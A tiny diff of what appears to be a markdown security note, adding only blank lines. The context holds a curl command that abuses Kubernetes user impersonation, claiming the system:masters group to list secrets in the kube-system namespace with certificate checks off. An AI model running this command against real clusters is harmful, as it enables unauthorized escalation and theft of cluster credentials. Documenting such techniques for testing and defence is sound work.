@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:34:06.537784+00:00'
 ```bash
 curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" -H "Impersonate-Group: system:masters" -H "Impersonate-User: null" -H "Accept: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
 ```
+
+
